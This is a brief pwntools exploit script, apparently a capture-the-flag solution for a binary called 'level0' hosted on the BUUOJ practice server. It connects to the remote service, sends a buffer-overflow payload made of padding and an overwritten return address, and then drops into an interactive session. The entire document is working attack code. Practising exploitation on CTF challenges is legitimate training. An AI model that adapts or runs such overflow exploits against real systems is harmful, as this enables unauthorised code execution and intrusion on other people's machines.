from pwn import *
#io = process("./level0")
io = remote("node3.buuoj.cn", 25512)
payload = b'I'*20 + b'a'*4 + p64(0x8048F0D)
io.send(payload)
io.interactive()